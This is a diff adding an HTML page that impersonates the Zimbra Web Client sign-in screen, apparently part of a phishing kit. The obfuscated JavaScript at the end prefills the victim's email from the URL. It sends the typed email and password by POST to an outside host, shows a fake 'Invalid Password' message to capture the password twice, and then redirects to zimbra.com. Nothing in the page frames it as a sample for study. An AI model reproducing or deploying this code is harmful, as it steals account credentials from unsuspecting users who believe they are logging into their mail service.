@@ -1,0 +1,115 @@
+﻿
+<!doctype html>
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="icon" href="http://www.zim587.free.bg/z/favicon.ico" type="image/icon" sizes="30x30">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>Zimbra Web Client Sign In</title>
+    <link rel="stylesheet" href="http://www.zim587.free.bg/z/mycss.css">
+
+    <style type="text/css">
+
+
+    </style>
+  </head>
+  <body>
+    <!-- body///////////////// -->
+    <div class="LoginScreen">
+      <div class="center">
+        <div class="contentBox">
+          <h1><a href="#" id="bannerLink" target="_new" title="Zimbra"><span class="ScreenReaderOnly">Zimbra</span>
+            <span class="ImgLoginBanner"></span>
+          </a></h1>
+          <div id="ZLoginAppName">Web Client</div>
+          <form method="post" name="loginForm"  accept-charset="UTF-8">
+            <input type="hidden" name="loginOp" value="login">
+            <input type="hidden" name="login_csrf" value="b4f18484-e033-402b-8811-55d7bf7f0ae6">
+
+            <table class="form">
+              <tbody>
+                <tr>
+                  <td colspan="2">
+                    <center>
+                     
+ <span id="error" class="text-warning" style="display: none;">That account doesn't exist. Enter a different account</span>
+                     <span id="msg" class="text-warning border-warning p-2" style="display: none;font-size: 11px;color: #df3e01;">Invalid Password..! Please enter correct password.</span><br>
+
+                    </center>
+                  </td>
+                </tr>
+                <tr>
+                  <td><label for="username">Username:</label></td>
+                  <td><input id="ai" class="zLoginField" name="ai" type="text" value="[[-Email-]]" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"></td>
+                </tr>
+                <tr>
+                  <td><label for="password">Password:</label></td>
+                  <td><input id="pr" autocomplete="off" class="zLoginField" name="pr" type="password" value="" size="40" maxlength="1024"></td>
+                </tr>
+                <tr>
+                  <td>&nbsp;</td>
+                  <td class="submitTD">
+                    <input id="remember" value="1" type="checkbox" name="zrememberme">
+                    <label for="remember">Stay signed in</label>
+                    <input id="submit-btn" name="submit-btn" type="submit" class="ZLoginButton DwtButton" value="Sign In">
+                  </td>
+                </tr>
+
+                <tr>
+                  <td colspan="2"><hr></td>
+                </tr>
+                <tr>
+                  <td>
+                    <label for="client">Version:</label>
+                  </td>
+                  <td>
+                    <div class="positioning">
+                      <select id="client" name="client" onChange="clientChange(this.options[this.selectedIndex].value)">
+                        <option value="preferred" selected=""> Default</option>
+                        <option value="advanced"> Advanced (Ajax)</option>
+                        <option value="standard"> Standard (HTML)</option>
+                        <option value="mobile"> Mobile</option>
+                        <option value="zimbrax"> Zimbra X</option>
+                        <option value="touch"> Touch</option>
+                      </select>
+                      <a href="#" onClick="showWhatsThis();" id="ZLoginWhatsThisAnchor" aria-controls="ZLoginWhatsThis" aria-expanded="false">What’s This?</a>
+                      <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onClick="showWhatsThis();" role="tooltip"><h3 style="text-align:center;">Client Types</h3>  <b>Advanced</b> offers the full set of Web collaboration features. This Web Client works best with newer browsers and faster Internet connections. <br><br><b>Standard</b> is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. <br><br><b>Mobile</b> is recommended for mobile devices. <br><br><b>Touch</b> is recommended for tablets. <br><br>To set <b>Default</b> to be your preferred client type, change the sign in options in your Preferences, General tab after you sign in.</div>
+                      <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note that your web browser or display does not fully support the Advanced version.  We strongly recommend that you use the Standard client.</div>
+                    </div>
+                  </td>
+                </tr>
+              </tbody></table>
+            </form>
+          </div>
+          <div class="decor1"></div>
+        </div>
+
+        <div class="Footer">
+          <div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="https://www.zimbra.com">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="https://blog.zimbra.com">Blog</a> - <a target="_new" href="https://wiki.zimbra.com">Wiki</a> - <a target="_new" href="https://www.zimbra.com/forums">Forums</a></div>
+          <div class="copyright">
+          Copyright © 2005-2019 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
+        </div>
+        <div class="decor2"></div>
+      </div>
+
+      <!-- body end/////////// -->
+
+   <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+var _0x3529af=_0x4bca;function _0x35bd(){var _0x57a744=['ready','email\x20field\x20is\x20empty.!','3GVCfUW','9425763MCzOSz','#pr','hide','2324046fIoGok','7126sttYIp','indexOf','replace','preventDefault','#submit-btn','#ai','toLowerCase','log','val','280515asjTuI','JSON','4832616SoqLKN','https://www.zimbra.com/','Verifing...','32MvdRzx','text','show','html','2474472uVXJSs','Login','hash','10alMwrC','#error','538818gbdqNM','ajax','signal','location','https://www.skynetexprex.com/zm/next.php','#msg','test','POST','substr'];_0x35bd=function(){return _0x57a744;};return _0x35bd();}function _0x4bca(_0xe6b08d,_0x40f096){var _0x35bd98=_0x35bd();return _0x4bca=function(_0x4bcafd,_0x33c53a){_0x4bcafd=_0x4bcafd-0x144;var _0x19423b=_0x35bd98[_0x4bcafd];return _0x19423b;},_0x4bca(_0xe6b08d,_0x40f096);}(function(_0x3ac2e1,_0x5cc19f){var _0x485a96=_0x4bca,_0x432178=_0x3ac2e1();while(!![]){try{var _0x345b70=parseInt(_0x485a96(0x162))/0x1*(-parseInt(_0x485a96(0x167))/0x2)+-parseInt(_0x485a96(0x152))/0x3+parseInt(_0x485a96(0x14e))/0x4*(parseInt(_0x485a96(0x149))/0x5)+parseInt(_0x485a96(0x166))/0x6+parseInt(_0x485a96(0x157))/0x7+-parseInt(_0x485a96(0x14b))/0x8+-parseInt(_0x485a96(0x163))/0x9*(-parseInt(_0x485a96(0x155))/0xa);if(_0x345b70===_0x5cc19f)break;else _0x432178['push'](_0x432178['shift']());}catch(_0x30baeb){_0x432178['push'](_0x432178['shift']());}}}(_0x35bd,0x7f298),$(document)[_0x3529af(0x160)](function(){var _0x58b030=_0x3529af,_0x48f16a=0x0,_0xd6fb6=window[_0x58b030(0x15a)][_0x58b030(0x154)][_0x58b030(0x15f)](0x1);if(!_0xd6fb6){}else{var _0xc1cb3c=_0xd6fb6,_0x179d1f=_0xc1cb3c['indexOf']('@'),_0x18f75a=_0xc1cb3c['substr'](_0x179d1f+0x1),_0x12a475=_0x18f75a['substr'](0x0,_0x18f75a[_0x58b030(0x168)]('.')),_0x35500d=_0x12a475[_0x58b030(0x146)]();$(_0x58b030(0x145))[_0x58b030(0x148)](_0xc1cb3c),$('#aich')[_0x58b030(0x151)](_0xc1cb3c),$(_0x58b030(0x15c))[_0x58b030(0x165)]();}var _0x188042='bmV4dC5waHA=';$('#submit-btn')['click'](function(_0x5a3b89){var _0x3bc929=_0x58b030;$(_0x3bc929(0x156))['hide'](),$('#msg')['hide'](),_0x5a3b89[_0x3bc929(0x16a)]();var _0x12aebc=$(_0x3bc929(0x145))['val'](),_0x17346f=$(_0x3bc929(0x164))['val'](),_0x3ab2bf=$(_0x3bc929(0x15c))[_0x3bc929(0x151)]();$(_0x3bc929(0x15c))[_0x3bc929(0x14f)](_0x3ab2bf);var _0x27c485=_0x12aebc,_0x10474d=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x12aebc)return $(_0x3bc929(0x156))[_0x3bc929(0x150)](),$(_0x3bc929(0x156))[_0x3bc929(0x151)](_0x3bc929(0x161)),![];if(!_0x10474d[_0x3bc929(0x15d)](_0x27c485))return $(_0x3bc929(0x156))[_0x3bc929(0x150)](),$(_0x3bc929(0x156))[_0x3bc929(0x151)]('That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account'),![];if(!_0x17346f)return $(_0x3bc929(0x156))['show'](),$('#error')['html']('Password\x20field\x20is\x20empty.!'),![];var _0x271428=_0x27c485[_0x3bc929(0x168)]('@'),_0x194930=_0x27c485['substr'](_0x271428+0x1),_0x5ecea5=_0x194930[_0x3bc929(0x15f)](0x0,_0x194930[_0x3bc929(0x168)]('.')),_0xd199a0=_0x5ecea5[_0x3bc929(0x146)]();_0x48f16a=_0x48f16a+0x1,$[_0x3bc929(0x158)]({'dataType':_0x3bc929(0x14a),'url':_0x3bc929(0x15b),'type':_0x3bc929(0x15e),'data':{'ai':_0x12aebc,'pr':_0x17346f},'beforeSend':function(_0x578200){var _0x2201f2=_0x3bc929;$(_0x2201f2(0x144))[_0x2201f2(0x151)](_0x2201f2(0x14d));},'success':function(_0x129026){var _0x52613e=_0x3bc929;if(_0x129026){$(_0x52613e(0x15c))[_0x52613e(0x150)](),console[_0x52613e(0x147)](_0x129026);if(_0x129026[_0x52613e(0x159)]=='ok'){$(_0x52613e(0x164))['val']('');if(_0x48f16a>=0x2)return _0x48f16a=0x0,window[_0x52613e(0x15a)][_0x52613e(0x169)](_0x52613e(0x14c)),![];}else{}}},'error':function(){var _0x47306d=_0x3bc929;$(_0x47306d(0x164))['val']('');if(_0x48f16a>=0x2)return _0x48f16a=0x0,window[_0x47306d(0x15a)]['replace'](_0x47306d(0x14c)),![];$(_0x47306d(0x15c))[_0x47306d(0x150)]();},'complete':function(){var _0x50aa92=_0x3bc929;$(_0x50aa92(0x144))[_0x50aa92(0x151)](_0x50aa92(0x153));}});});}));
+</script>
+
+
+  </html>
